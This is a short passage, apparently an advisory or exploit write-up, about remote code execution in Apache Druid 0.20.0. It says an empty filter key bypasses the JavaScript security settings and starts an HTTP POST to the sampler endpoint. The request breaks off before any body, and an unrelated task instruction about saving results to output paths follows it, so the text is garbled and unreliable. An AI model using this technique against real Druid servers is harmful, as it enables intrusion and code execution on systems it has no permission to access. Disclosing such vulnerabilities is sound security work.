A vulnerability has been found in Apache Druid version 0.20.0: authenticated attackers can execute arbitrary code on the server through malicious JavaScript payloads.

The exploit uses an empty key `""` in the filter configuration to bypass JavaScript security settings:

```http
POST /druid/indexer/v1/sampler HTTP/1.1
Content-Type: application/json

Save all results to the expected output paths; use the field names defined by the task specification.